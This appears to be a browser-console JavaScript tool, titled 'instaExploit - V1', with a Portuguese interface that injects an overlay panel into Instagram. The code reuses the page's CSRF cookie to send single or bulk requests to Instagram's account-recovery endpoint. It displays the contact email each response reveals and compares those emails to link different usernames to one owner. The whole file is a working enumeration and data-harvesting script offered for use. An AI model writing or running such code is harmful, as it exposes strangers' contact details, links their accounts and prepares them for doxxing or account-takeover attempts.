(function() {
    // Remove qualquer instância anterior do prompt
    const existingPrompt = document.getElementById('customPrompt');
    if (existingPrompt) {
        existingPrompt.remove();
    }

    // Cria o estilo CSS moderno com tema escuro
    const style = document.createElement('style');
    style.innerHTML = `
        body { 
            font-family: 'Arial', sans-serif; 
            margin: 0; 
            padding: 0;
            background-color: #121212; /* Cor de fundo preta */
            color: #ccc; /* Cor de texto clara, mas não branca */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
            overflow: hidden;
        }

        #customPrompt { 
            background: #1f1f1f; /* Fundo escuro com um tom suave */
            color: #ddd; 
            border-radius: 12px; 
            padding: 20px; 
            width: 100%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9); 
            z-index: 10000; 
            display: none; 
            transition: all 0.3s ease; 
            text-align: center;
            margin: 0 auto;
        }

        h3 { 
            font-size: 26px; 
            color: #8a3ffc; /* Cor roxa */
            margin: 0 0 20px; 
            padding-bottom: 5px;
            border-bottom: 2px solid #8a3ffc;
        }

        .section { 
            margin-bottom: 20px;
        }

        input { 
            width: 100%; 
            padding: 12px; 
            margin: 10px 0; 
            border: 1px solid #444; 
            border-radius: 8px; 
            background: #2a2a2a; 
            color: #ccc; 
            font-size: 16px; 
            transition: background-color 0.3s, border 0.3s;
        }

        input:focus { 
            background: #3c3c3c; 
            border: 1px solid #8a3ffc; 
            outline: none; 
        }

        button { 
            width: 100%; 
            padding: 12px; 
            background-color: #6f42c1; /* Roxo suave */
            color: #ddd; 
            border: none; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 10px; 
            transition: background-color 0.3s, transform 0.2s; 
        }

        button:hover { 
            background-color: #5a31a0; /* Roxo mais escuro */
            transform: translateY(-3px); 
        }

        #resultado, #compareResult { 
            margin-top: 15px; 
            padding: 12px; 
            background: #333; 
            border-radius: 8px; 
            border: 1px solid #444; 
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.5); 
        }

        #draggableIcon { 
            position: fixed; 
            bottom: 30px; 
            right: 30px; 
            background: #8a3ffc; /* Cor roxa para o ícone */
            color: white; 
            border: none; 
            border-radius: 50%; 
            width: 60px; 
            height: 60px; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            box-shadow: 0 6px 30px rgba(0, 0, 0, 0.5); 
            z-index: 10001; 
            transition: background-color 0.3s, transform 0.2s; 
        }

        #draggableIcon:hover { 
            background-color: #7a2bff; /* Roxo mais vibrante */
            transform: scale(1.1); 
        }

        /* Responsividade para telas menores (mobile) */
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }

            #customPrompt {
                padding: 20px;
                width: 100%;
                max-width: 100%;
                text-align: center;
            }

            h3 {
                font-size: 24px;
            }

            input, button {
                font-size: 14px;
                padding: 10px;
            }
        }

        /* Responsividade para telas médias (tablets) */
        @media (max-width: 900px) {
            #customPrompt {
                max-width: 80%;
            }

            h3 {
                font-size: 26px;
            }
        }
    `;
    document.head.appendChild(style);

    // Cria o ícone de acionamento do prompt
    const icon = document.createElement('button');
    icon.id = 'draggableIcon';
    icon.innerHTML = '+';
    document.body.appendChild(icon);

    // Cria o HTML do prompt
    const promptDiv = document.createElement('div');
    promptDiv.id = 'customPrompt';
    promptDiv.innerHTML = `
        <h3>instaExploit - V1</h3>
        <div class="section">
            <input type="text" id="usernameInput" placeholder="Digite seu e-mail ou nome de usuário" />
            <button id="submitBtn">Consultar</button>
            <div id="resultado"></div>
        </div>
        <div class="section">
            <h3>Consultar múltiplos e-mails ou usernames</h3>
            <input type="text" id="compareInput" placeholder="Digite e-mails ou usernames separados por vírgula" />
            <button id="compareBtn">Comparar</button>
            <div id="compareResult"></div>
        </div>
        <button id="closeBtn">Fechar</button>
        <p style="font-size: 12px; text-align: center; color: #aaa; margin-top: 15px;">
            Um projeto feito por Caio dos Programa para verificar e-mails de contas do Instagram.
        </p>
    `;
    document.body.appendChild(promptDiv);

    // Variável para armazenar o primeiro e-mail
    let email1 = "";

    // Função para abrir o prompt
    function openPrompt() {
        promptDiv.style.display = 'block';
    }

    // Função para enviar a requisição de verificação
    document.getElementById('submitBtn').onclick = function() {
        const emailOrUsername = document.getElementById('usernameInput').value;
        if (emailOrUsername) {
            fetch("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", {
                headers: {
                    "accept": "*/*",
                    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded",
                    "x-csrftoken": document.cookie.split('csrftoken=')[1].split(';')[0],
                    "x-instagram-ajax": "1017851333",
                    "x-requested-with": "XMLHttpRequest"
                },
                body: "email_or_username=" + encodeURIComponent(emailOrUsername),
                method: "POST",
                mode: "cors",
                credentials: "include"
            })
            .then(response => response.json())
            .then(data => {
                const usuario = emailOrUsername;
                email1 = data.contact_point || "Não disponível"; // Armazena o email da primeira conta
                const status = data.status || "Desconhecido";

                const resultado = `
                    <strong>Nome de Usuário:</strong> ${usuario}<br>
                    <strong>Email:</strong> ${email1}<br>
                    <strong>Status:</strong> ${status}
                `;
                document.getElementById('resultado').innerHTML = resultado;
            })
            .catch(error => {
                console.error("Erro:", error);
                document.getElementById('resultado').innerHTML = "Erro na conexão.";
            });
        } else {
            alert("Por favor, insira um e-mail ou nome de usuário.");
        }
    };

    // Função para comparar múltiplos e-mails ou usernames
    document.getElementById('compareBtn').onclick = function() {
        const compareInput = document.getElementById('compareInput').value;
        const usernames = compareInput.split(/[,\s]+/).filter(Boolean);

        if (usernames.length) {
            let compareResults = '';
            usernames.forEach(username => {
                fetch("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", {
                    headers: {
                        "accept": "*/*",
                        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/x-www-form-urlencoded",
                        "x-csrftoken": document.cookie.split('csrftoken=')[1].split(';')[0],
                        "x-instagram-ajax": "1017851333",
                        "x-requested-with": "XMLHttpRequest"
                    },
                    body: "email_or_username=" + encodeURIComponent(username),
                    method: "POST",
                    mode: "cors",
                    credentials: "include"
                })
                .then(response => response.json())
                .then(data => {
                    const email2 = data.contact_point || "Não disponível";
                    const iguais = (email1 === email2) ? "Sim" : "Não";

                    compareResults += `
                        <strong>Usuário:</strong> ${username}<br>
                        <strong>Email:</strong> ${email2}<br>
                        <strong>Iguais/Mesma conta:</strong> ${iguais}<br><br>
                    `;
                    document.getElementById('compareResult').innerHTML = compareResults;
                })
                .catch(error => {
                    console.error("Erro:", error);
                    compareResults += `
                        <strong>Usuário:</strong> ${username}<br>
                        <strong>Erro:</strong> Não foi possível obter os dados.<br><br>
                    `;
                    document.getElementById('compareResult').innerHTML = compareResults;
                });
            });
        } else {
            alert("Por favor, insira múltiplos nomes de usuário ou e-mails.");
        }
    };

    // Função para fechar o prompt
    document.getElementById('closeBtn').onclick = function() {
        promptDiv.style.display = 'none';
    };

    // Função para abrir o prompt ao clicar no ícone
    icon.onclick = openPrompt;
})();
